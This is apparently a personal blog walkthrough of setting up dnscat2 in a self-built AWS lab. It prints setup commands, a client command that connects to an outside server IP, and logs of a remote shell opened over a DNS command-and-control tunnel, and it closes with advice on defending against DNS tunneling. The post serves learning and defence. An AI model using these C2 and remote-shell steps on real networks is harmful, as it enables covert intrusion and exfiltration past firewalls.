---
layout: post
title: "dnscat2: Command and Control over the DNS"
comments: false
excerpt_separator: <!--more-->
---
No matter how tightly you restrict outbound access from your network, you probably allow DNS protocol to at least one server. Adversaries can abuse this access in your firewall to establish stealthy Command and Control (C2) channels or to exfiltrate data that is difficult to block. To understand the use of DNS for C2 tunneling, let’s take a look at Ron Bowes’s tool [dnscat2](https://github.com/iagox86/dnscat2){:target="_blank"}, which makes it relatively easy to experiment with such attack techniques.
<!--more-->

As per the dnscat2 documentation, author describes this tool as - 
> a DNS tunnel that WON'T make you sick and kill you! 

This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.

Even though instrutions to setup dnscat2 are pretty straightforward, I came across several error messages while trying to make it work. Leaving my notes here for my future self and for everyone esle who is trying to play around with this tool. We will be making use of two AWS acounts, one for client and other for server and configurations can be found below:

<a href="/assets/img/blog/DNScat2.jpg" data-lightbox="blog_six">
<img src="/assets/img/blog/DNScat2.jpg"/>
</a>

Bastion Host security groups inbound rules:
<a href="/assets/img/blog/DNScat2_Bastion_Host_1.jpg" data-lightbox="blog_six">
<img src="/assets/img/blog/DNScat2_Bastion_Host_1.jpg"/>
</a>
Bastion Host security groups outbound rules:
<a href="/assets/img/blog/DNScat2_Bastion_Host_2.jpg" data-lightbox="blog_six">
<img src="/assets/img/blog/DNScat2_Bastion_Host_2.jpg"/>
</a>
DNS Client security groups inbound rules:
<a href="/assets/img/blog/DNScat2_Private_Server_1.jpg" data-lightbox="blog_six">
<img src="/assets/img/blog/DNScat2_Private_Server_1.jpg"/>
</a>
DNS Client security group outbound rules:
<a href="/assets/img/blog/DNScat2_Private_Server_2.jpg" data-lightbox="blog_six">
<img src="/assets/img/blog/DNScat2_Private_Server_1.jpg"/>
</a>

dnscat2 comes in two parts: the client and the server.

The client is designed to be run on a compromised machine. It's written in C and has the minimum possible dependencies. It should run just about anywhere.

### Server Setup
For all the EC2 instances, we will be using the Ubuntu AMI (Amazon Machine Image). The server isn't "compiled", as such, but it does require some Ruby dependencies. 

```shell
$ sudo apt-get update
$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/server/

$ sudo apt-get install build-essential
$ sudo apt-get install ruby
$ sudo apt-get install ruby-dev

$ sudo gem install bundler
$ bundle install
```

On Server, you can verify dnscat2 is successfully compiled by running it with no flags; you'll see it attempting to start a DNS tunnel with whatever your configured DNS server is (which will fail):

```shell
ubuntu@ip-172-31-33-167:~/dnscat2/server$ sudo systemctl stop systemd-resolved
ubuntu@ip-172-31-33-167:~/dnscat2/server$ sudo ruby ./dnscat2.rb
sudo: unable to resolve host ip-172-31-90-81: Resource temporarily unavailable

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = n/a]...

It looks like you didn't give me any domains to recognize!
That's cool, though, you can still use direct queries,
although those are less stealthy.

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=6190b0ad9dff0d1483d89fcfa869ab60

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2>
```
### Client Setup
Build and run dnscat2 client on bastion host machine

> ./dnscat --dns server=x.x.x.x,port=53 --secret=6190b0ad9dff0d1483d89fcfa869ab60

Replace the x.x.x.x with the public IP of the DNS Server's EC2 instance.

```shell
ubuntu@@ip-172-31-33-167::~/dnscat2/client$ ./dnscat --dns server=18.212.67.90,port=53 --secret=6190b0ad9dff0d1483d89fcfa869ab60
Creating DNS driver:
 domain = (null)
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 18.212.67.90

** Peer verified with pre-shared secret!

Session established!
```
We'll use the window command to interact with 1, where we run the `shell` command to get access to shell for the DNS client.

```shell
dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains =  [*]
dnscat2> window -i 1
Window 1 not found!

0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains =  [*]
dnscat2> Can't close the main window!
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains =  [*]
  1 :: command (ip-172-31-33-167) [encrypted and verified] [*]
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.
```
```shell
command (ip-172-31-33-167) 1> shell
Sent request to execute a shell
command (ip-172-31-33-167) 1> New window created: 2
Shell session created!
```
To escape this, you can use ctrl-z and switch to window 2 to access the shell session:
```shell
dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains =  [*]
  1 :: command (ip-172-31-33-167) [encrypted and verified] [*] [idle for 126 seconds]
  2 :: sh (ip-172-31-33-167) [encrypted and verified] [idle for 126 seconds]

dnscat2> window -i 2
New window created: 2
history_size (session) => 1000
Session 2 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.
```

```shell
sh (ip-172-31-33-167) 4> pwd
sh (ip-172-31-33-167) 4> /home/ubuntu/dnscat2/client
```

### How to defend against C2 tunneling over DNS?

- Limit the number of DNS servers that systems on your network are allowed to reach to not only complicate the adversary’s tunneling setup, but also to limit the types of DNS interactions you need to oversee.
- If possible, direct DNS activities through a set of DNS servers that you control, so you can keep an eye on them and tweak there configuration when necessary.
- Monitor DNS activities for anomalies, looking at DNS server or network logs. The use of DNS for C2 tends to exhibit timing and payload deviations that might allow you to spot misuse.

## References
- <https://github.com/iagox86/dnscat2>{:target="_blank"}
- <https://dejandayoff.com/using-dns-to-break-out-of-isolated-networks-in-a-aws-cloud-environment/>{:target="_blank"}
- <https://www.sans.org/reading-room/whitepapers/dns/paper/34152>{:target="_blank"}